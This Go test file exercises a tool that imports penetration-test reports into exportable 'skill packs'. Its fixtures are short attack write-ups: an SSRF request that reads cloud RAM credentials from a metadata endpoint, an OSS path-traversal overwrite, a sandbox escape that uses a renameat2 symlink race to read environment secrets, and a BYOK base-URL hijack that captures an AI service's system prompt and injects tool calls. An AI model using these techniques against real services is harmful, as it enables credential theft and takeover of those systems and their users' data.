package server

import (
	"archive/zip"
	"bytes"
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Autumn-27/artex/db"
)

func TestImportReportSkillMultiFileMarkdownAndJSON(t *testing.T) {
	s, _, dir := newSkillServer(t)

	mdReport := `# 渗透测试报告：notegpt.io

- **任务目标**：https://notegpt.io
- **生成时间**：2026-10-18 10:00:00

## 探索过程与推导链

1. 逆向 crypto_util_bg.wasm 还原 md5(biz+nonce+t+salt) 签名算法
2. 测试 /api/v1/upload/sign-url 预签名目录穿越与原始路径 PUT

## 踩坑记录、受阻陷阱与 3-Strike 止损

- **[意图BLOCKED]** 直接用标准 HTTP 客户端发送 ../ 路径 —— **踩坑/止损原因**：客户端自动归一化 ../ 导致 OSS 返回 403 SignatureDoesNotMatch

## 漏洞

### 1. [CRITICAL] 截图上传接口全回显 SSRF 泄露阿里云 RAM 临时凭证

通过 POST /api/v2/upload-screenshot 传入 http://100.100.100.200/latest/meta-data/ram/security-credentials/ 读取 STS 凭证。

**PoC / 证据：**

` + "```" + `
POST /api/v2/upload-screenshot HTTP/1.1
Host: notegpt.io

{"uploaded_screen_shot_url":"http://100.100.100.200/latest/meta-data/ram/security-credentials/role"}
` + "```" + `
`

	jsonReport := `[
  {
    "name": "WASM 签名逆向与 OSS 预签名目录穿越任意文件覆盖",
    "vuln_class": "Path Traversal / Arbitrary File Overwrite",
    "severity": "high",
    "summary": "逆向 crypto_util_bg.wasm 后调用 /api/v1/upload/sign-url 传入 biz: ../../../deploy 并用未归一化 HTTP PUT 覆盖任意对象。",
    "evidence": "PUT /notegpt/web/../../../deploy/poc.txt?OSSAccessKeyId=..."
  }
]`

	apply := true
	useLLM := false
	res, err := s.ImportReportSkill(context.Background(), ReportImportRequest{
		Name:   "test-notegpt-pack",
		Domain: "auto",
		Focus:  "重点提炼 WASM 签名逆向与 OSS 路径归一化陷阱",
		UseLLM: &useLLM,
		Apply:  &apply,
		Files: []ReportImportFile{
			{Filename: "notegpt.ai.md", Content: mdReport},
			{Filename: "findings.json", Content: jsonReport},
		},
	})
	if err != nil {
		t.Fatalf("ImportReportSkill 失败: %v", err)
	}
	if !res.OK || res.Skill != "test-notegpt-pack" || res.Status != db.SkillProposalApplied {
		t.Fatalf("返回结果不符合预期: %+v", res)
	}
	if res.FindingsCount < 2 || res.PitfallsCount < 2 {
		t.Fatalf("提取的漏洞数(%d)或踩坑数(%d)不足", res.FindingsCount, res.PitfallsCount)
	}

	for _, rel := range []string{"SKILL.md", "references/pitfalls-and-bypasses.md", "references/attack-chains-and-pocs.md"} {
		if !skillFileExists(dir, "test-notegpt-pack", rel) {
			t.Errorf("技能包缺少文件 %s", rel)
		}
	}

	fm := parseSkillFrontmatter(t, filepath.Join(dir, "test-notegpt-pack", "SKILL.md"))
	if fm.name != "test-notegpt-pack" {
		t.Errorf("frontmatter name = %q", fm.name)
	}
	if warnings := db.LintSkillContent(res.Proposal.Content); len(warnings) > 0 {
		t.Errorf("SKILL.md 存在 Lint 告警: %+v", warnings)
	}
	if !strings.Contains(fm.body, "## Pitfalls") || !strings.Contains(fm.body, "SignatureDoesNotMatch") {
		t.Errorf("SKILL.md 未包含预期的踩坑陷阱说明:\n%s", fm.body)
	}
}

func TestImportReportSkillPendingAndCompanionApprove(t *testing.T) {
	s, _, dir := newSkillServer(t)

	txtReport := `# free.ai 沙箱渗透复盘
1. POST /coder/session 传入 safe_mode=false 获取命令执行
2. 静态软链接被拦截后，改用 renameat2(RENAME_EXCHANGE) 竞争 GET /coder/session/{sid}/download 读取 /proc/self/environ
3. 提取 WEB_SERVER_SECRET 与 TRUSTED_SERVICE_SECRETS 横向接管 /api/internal/verify/
`
	apply := false
	useLLM := false
	res, err := s.ImportReportSkill(context.Background(), ReportImportRequest{
		Name:    "test-freeai-pending",
		UseLLM:  &useLLM,
		Apply:   &apply,
		Content: txtReport,
	})
	if err != nil {
		t.Fatalf("ImportReportSkill pending 失败: %v", err)
	}
	if res.Status != db.SkillProposalPending || res.Proposal == nil {
		t.Fatalf("应处于 pending 状态: %+v", res)
	}
	if skillFileExists(dir, "test-freeai-pending", "SKILL.md") {
		t.Fatal("pending 状态下不应提前落盘")
	}

	// 批准主 SKILL.md 提议时应自动联动写入同包下的 references/* 支撑文件
	if _, err := s.reviewProposal(context.Background(), res.Proposal.ID, "approve", "审阅通过"); err != nil {
		t.Fatalf("批准失败: %v", err)
	}
	for _, rel := range []string{"SKILL.md", "references/pitfalls-and-bypasses.md", "references/attack-chains-and-pocs.md"} {
		if !skillFileExists(dir, "test-freeai-pending", rel) {
			t.Errorf("批准主提议后未联动落盘支撑文件 %s", rel)
		}
	}
}

func TestExportSkillZipHTTP(t *testing.T) {
	s, _, _ := newSkillServer(t)
	apply := true
	useLLM := false
	_, err := s.ImportReportSkill(context.Background(), ReportImportRequest{
		Name:    "test-export-pack",
		UseLLM:  &useLLM,
		Apply:   &apply,
		Content: "### 1. [HIGH] BYOK BaseURL 劫持与伪造 tool_calls\n通过 byok_base_url 截获系统提示词并注入 tool_calls。\n",
	})
	if err != nil {
		t.Fatal(err)
	}

	mux := http.NewServeMux()
	mux.HandleFunc("GET /api/skills/{name}/export", s.fsExportSkillZip)
	mux.HandleFunc("POST /api/skills/import-report", s.fsImportReportSkill)

	req := httptest.NewRequest("GET", "/api/skills/test-export-pack/export", nil)
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)
	if rec.Code != 200 {
		t.Fatalf("导出 zip 状态码 = %d, body = %s", rec.Code, rec.Body.String())
	}
	zr, err := zip.NewReader(bytes.NewReader(rec.Body.Bytes()), int64(rec.Body.Len()))
	if err != nil {
		t.Fatalf("解析导出的 zip 失败: %v", err)
	}
	foundFiles := map[string]bool{}
	for _, f := range zr.File {
		foundFiles[f.Name] = true
	}
	for _, want := range []string{
		"test-export-pack/SKILL.md",
		"test-export-pack/references/pitfalls-and-bypasses.md",
		"test-export-pack/references/attack-chains-and-pocs.md",
	} {
		if !foundFiles[want] {
			t.Errorf("导出的 zip 缺少 %s（实际包含 %v）", want, foundFiles)
		}
	}

	// 验证 JSON POST /api/skills/import-report
	body, _ := json.Marshal(map[string]any{
		"name":    "test-http-import",
		"use_llm": false,
		"apply":   true,
		"content": "### 1. [CRITICAL] 沙箱 renameat2 符号链接竞争\n使用 renameat2 绕过软链接检查读取 /proc/self/environ。\n",
	})
	reqImport := httptest.NewRequest("POST", "/api/skills/import-report", bytes.NewReader(body))
	reqImport.Header.Set("Content-Type", "application/json")
	recImport := httptest.NewRecorder()
	mux.ServeHTTP(recImport, reqImport)
	if recImport.Code != 200 {
		t.Fatalf("POST /api/skills/import-report 状态码 = %d, body = %s", recImport.Code, recImport.Body.String())
	}
}
